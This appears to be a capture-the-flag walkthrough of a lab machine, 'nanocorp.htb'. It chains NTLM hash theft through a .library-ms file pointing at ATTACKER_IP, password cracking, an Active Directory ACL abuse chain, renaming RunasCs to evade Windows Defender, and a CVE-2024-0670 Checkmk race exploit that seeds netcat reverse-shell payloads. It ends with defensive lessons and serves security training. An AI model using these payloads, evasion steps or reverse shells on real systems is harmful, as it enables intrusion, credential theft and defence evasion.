Section 03

Initial Access — .library-ms NTLM Theft

02
Craft .library-ms UNC Payload
Windows Library File · SMB Coercion · Responder

When Windows extracts a ZIP containing a .library-ms file, it automatically processes the XML and attempts to connect to any UNC path defined in the <simpleLocation> tag. This triggers an outbound SMB connection carrying the NTLMv2 hash of the account running the web server process. The Responder HTTP/HTTPS listeners must be disabled to avoid intercepting your own upload requests to the portal.

xml — Documents.library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\ATTACKER_IP\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
bash — package and capture
# Package the library file
zip library_fresh.zip Documents.library-ms

# Disable HTTP/HTTPS in Responder to avoid capturing own traffic
# Edit /usr/share/responder/Responder.conf:
HTTP  = Off
HTTPS = Off

# Start Responder
sudo responder -I tun0

# Upload the malicious ZIP to the hire portal
curl -s http://hire.nanocorp.htb/upload.php \
  -F "fullname=John Smith" \
  -F "email=john@nanocorp.htb" \
  -F "position=Software Engineer" \
  -F "resume=@library_fresh.zip"
responder output — NTLMv2 captured
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:<hash>
✓
NTLMv2 Hash Captured: web_svc account hash intercepted via automatic .library-ms UNC processing within ~60 seconds of upload.
⚠
Important: Always disable Responder's HTTP and HTTPS listeners when targeting a web application on the same interface. Otherwise Responder will intercept your own upload POST request and you'll never capture the outbound SMB authentication.
03
Crack NTLMv2 Hash
hashcat -m 5600 · rockyou.txt

The captured NTLMv2 hash (hashcat mode 5600) is cracked offline against the rockyou wordlist, recovering the plaintext password for the web_svc service account.

bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force

web_svc::NANOCORP:<hash>:dksehdgh712!@#
Status: Cracked
✓

Section 04

User Flag — AD ACL Chain

04
BloodHound AD Enumeration
bloodhound-python · ACL attack path

Running BloodHound ingestion with the recovered web_svc credentials reveals a three-hop ACL chain leading from web_svc to WinRM access on the DC. The critical path: web_svc has AddSelf on IT_SUPPORT → IT_SUPPORT has ForceChangePassword on monitoring_svc → monitoring_svc is in Remote Management Users.

bash
bloodhound-python -u web_svc -p 'dksehdgh712!@#' \
  -d nanocorp.htb -ns 10.129.243.199 -c all --zip
AccountSIDKey Groups / Rights
web_svc...1103Domain Users · AddSelf → IT_SUPPORT
IT_SUPPORTgroupForceChangePassword → monitoring_svc
monitoring_svc...3101Protected Users · Remote Management Users
✕
Critical: monitoring_svc is in Protected Users — this group blocks all NTLM authentication, Kerberos DES/RC4 encryption, and credential caching. Only Kerberos AES authentication is accepted. WinRM login requires a Kerberos TGT, not a password or hash.
05
Execute the AD Chain — AddSelf + ForceChangePassword
BloodyAD · group membership · password reset

Two BloodyAD calls execute the full ACL chain: first adding web_svc to IT_SUPPORT (using its AddSelf right), then using IT_SUPPORT's ForceChangePassword right to reset monitoring_svc's password. The password resets automatically after a period, so the kinit call must follow immediately.

bash
# Step 1: Add web_svc to IT_SUPPORT (AddSelf right)
bloodyAD -u web_svc -p 'dksehdgh712!@#' -d nanocorp.htb \
  --host dc01.nanocorp.htb add groupMember "IT_SUPPORT" "web_svc"

[+] web_svc added to IT_SUPPORT

# Step 2: Force-change monitoring_svc password (ForceChangePassword right)
bloodyAD -u web_svc -p 'dksehdgh712!@#' -d nanocorp.htb \
  --host dc01.nanocorp.htb -i 10.129.243.199 \
  set password monitoring_svc 'NewPassword@1!'

[+] Password changed successfully for monitoring_svc
⚠
Time-Critical: monitoring_svc's password resets automatically at short intervals. Chain the bloodyAD set password and kinit commands back-to-back without delay. If Kerberos fails, re-run the password change and immediately re-run kinit.
06
Kerberos Authentication + WinRM Shell
ntpdate · kinit · evil-winrm -r · Protected Users

Since monitoring_svc is in Protected Users, NTLM is completely blocked. A valid Kerberos TGT must be obtained via kinit (not impacket-getTGT — kinit creates an MIT krb5 ccache format that evil-winrm's GSSAPI library requires). Time synchronisation with the DC is mandatory before any Kerberos operation.

bash — /etc/krb5.conf
[libdefaults]
    default_realm = NANOCORP.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    NANOCORP.HTB = {
        kdc = dc01.nanocorp.htb
        admin_server = dc01.nanocorp.htb
    }

[domain_realm]
    .nanocorp.htb = NANOCORP.HTB
    nanocorp.htb = NANOCORP.HTB
bash — sync, authenticate, connect
# ALWAYS sync time before Kerberos ops
sudo ntpdate -u 10.129.243.199

# Get TGT via kinit (MIT krb5 ccache — required by evil-winrm GSSAPI)
echo 'NewPassword@1!' | kinit monitoring_svc@NANOCORP.HTB

# Connect via WinRM SSL with Kerberos realm
export KRB5CCNAME=/tmp/krb5cc_1000
evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB -S

*Evil-WinRM* PS C:\Users\monitoring_svc\Documents> type C:\Users\monitoring_svc\Desktop\user.txt
✓
WinRM Shell Obtained: PowerShell session as monitoring_svc on DC01 via Kerberos GSSAPI over WinRM SSL (port 5986).

Section 05

Root Flag — CVE-2024-0670

07
Checkmk Agent Discovery & CVE-2024-0670
Port 6556 · Checkmk 2.1.0p10 · MSI Repair Race

Enumeration from the WinRM shell reveals Checkmk Agent 2.1.0p10 running as LocalSystem on port 6556. CVE-2024-0670 affects Checkmk Agent for Windows below version 2.1.0p40. During an MSI repair (msiexec /fa), the agent temporarily writes and executes .cmd files in C:\Windows\Temp\ with predictable names: cmk_all_{PID}_{counter}.cmd. A low-privilege attacker can pre-seed thousands of these files with a malicious payload — when MSI repair picks one up, it executes as SYSTEM.

powershell — enumerate Checkmk from WinRM
# Confirm Checkmk on port 6556
netstat -ano | findstr 6556
TCP  0.0.0.0:6556  0.0.0.0:0  LISTENING  [PID]

# Check version
Get-ItemProperty "C:\ProgramData\checkmk\agent\*"
DisplayName   : Checkmk Agent 2.1.0p10
InstallLocation: C:\Program Files (x86)\checkmk\service\

# Confirm runs as SYSTEM
Get-WmiObject Win32_Service -Filter "Name='CheckMkService'" | Select StartName
StartName: LocalSystem
✕
CVE-2024-0670: The MSI repair mechanism for Checkmk Agent < 2.1.0p40 writes temporary .cmd files to C:\Windows\Temp\ using predictable filenames (cmk_all_{PID}_{counter}.cmd) and executes them as SYSTEM. Pre-seeding the entire PID range creates a near-certain race win.
08
Obfuscate RunasCs to Evade Windows Defender
Python rename · SvcHelper.cs · compile on-target

Windows Defender quarantines RunasCs.exe and RunasCs.cs instantly. The source code is obfuscated by renaming all class references and wrapping in a new namespace before transfer. Compilation must happen on-target in the Documents directory — Defender blocks .exe compilation directly in C:\Windows\Temp\.

python3 — attacker: obfuscate RunasCs
with open('RunasCs.cs', 'r') as f:
    code = f.read()

code = code.replace('RunasCsException', 'SvcHelperEx')
code = code.replace('RunasCs', 'SvcHelper')
code = 'namespace SystemServiceHelper {\n' + code + '\n}'

with open('SvcHelper.cs', 'w') as f:
    f.write(code)
powershell — compile on target (Documents dir, not Temp)
# Upload source to Documents
# (evil-winrm upload command from attacker)
upload SvcHelper.cs

# Compile with .NET Framework — must be from Documents, not Temp
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /optimize /out:SvcHelper.exe SvcHelper.cs

# Copy compiled binary to Temp
Copy-Item SvcHelper.exe C:\Windows\Temp\SvcHelper.exe -Force
⚠
AV Evasion: Do not compile in C:\Windows\Temp\ — Defender flags .exe creation there. Compile in user Documents, then copy. The obfuscated source must rename ALL RunasCs string literals, not just class names.
09
Deploy & Execute the Exploit
bad.ps1 · 28,000 seed files · msiexec /fa · SYSTEM shell

The exploit script seeds 28,000 .cmd files across the full PID range into C:\Windows\Temp\, each containing a netcat reverse shell payload. MSI repair is then triggered — when it executes any one of the pre-seeded files as SYSTEM, the reverse shell fires back to the attacker's listener on port 9001.

bash — attacker: prepare listener and file server
# Serve nc.exe and bad.ps1
python3 -m http.server 8000 &

# Start listener — MUST be port 9001
nc -lnvp 9001
powershell — bad.ps1 (exploit script)
# Download dependencies to Temp
cd C:\Windows\Temp
wget http://ATTACKER_IP:8000/nc.exe -UseBasicParsing -OutFile nc.exe
wget http://ATTACKER_IP:8000/bad.ps1 -UseBasicParsing -OutFile bad.ps1

# Clean up previous attempts
Stop-Process -Name msiexec -Force -EA SilentlyContinue
Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -EA SilentlyContinue

# Seed 28,000 .cmd files (PID 1000–15000, counters 0–1)
# Each file: @echo off\r\nnc.exe -e cmd.exe ATTACKER_IP 9001
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"
foreach ($ctr in 0..1) {
    for ($num = 1000; $num -le 15000; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        [System.IO.File]::WriteAllText($filePath, $BatchPayload, ...)
    }
}
Write-Host "[*] Seeding complete."

# Trigger MSI repair as SYSTEM via SvcHelper (web_svc creds)
# IMPORTANT: use full path to powershell.exe
.\SvcHelper.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"
◈
How the Race Wins: MSI repair locates the installed Checkmk MSI via HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\..., runs msiexec /fa, which internally writes a cmk_all_{PID}_{counter}.cmd to Temp. One of the 28,000 pre-seeded files will match. Defender doesn't scan .cmd files in time before msiexec executes them as SYSTEM.

key takeaways
01 // FILE UPLOAD SECURITY
.library-ms NTLM Coercion via ZIP
Archive extraction that processes Windows Library files triggers automatic UNC path resolution — leaking the server's NTLMv2 hash to any attacker-controlled host. Sanitise extracted content, disable automatic file-type processing, and block outbound SMB at the perimeter firewall.
02 // AD ACL HYGIENE
AddSelf + ForceChangePassword Chain
A service account holding AddSelf on a group that holds ForceChangePassword on a privileged account is a complete compromise path. Regular BloodHound auditing to detect chained ACL escalation paths is essential — no single ACE here was obviously dangerous, but the combination was lethal.
03 // PROTECTED USERS
Kerberos-Only Access Complicates Pivoting
Protected Users is a strong defence — NTLM, RC4, credential caching, and delegation are all blocked. However, if the account's password can be force-reset and a valid Kerberos TGT obtained via kinit, the protection doesn't prevent access. The real lesson is to also prevent ForceChangePassword ACEs on Protected Users members.
04 // AGENT PATCHING
CVE-2024-0670 — Checkmk MSI Race
Monitoring agents running as SYSTEM are high-value targets. CVE-2024-0670 shows that even the repair mechanism of a service can be a privilege escalation vector. Keep monitoring agents patched and consider running them under a least-privilege service account rather than LocalSystem.
05 // DEFENDER BYPASS
Obfuscation via Source Renaming
Windows Defender detected RunasCs by name and string signatures. Simple class/namespace renaming was sufficient to bypass detection. Compile on-target from source rather than uploading pre-built binaries — compiled output lacks the known-bad hashes. Compile in user directories, not \Temp\.
06 // KERBEROS OPS
Time Sync is Mandatory
Kerberos enforces a 5-minute clock skew tolerance. KDC_ERR_PREAUTH_FAILED errors that appear after a password change are almost always a time sync issue, not a wrong password. Always run ntpdate -u <DC_IP> before any Kerberos operation when attacking from a VM or VPN connection.
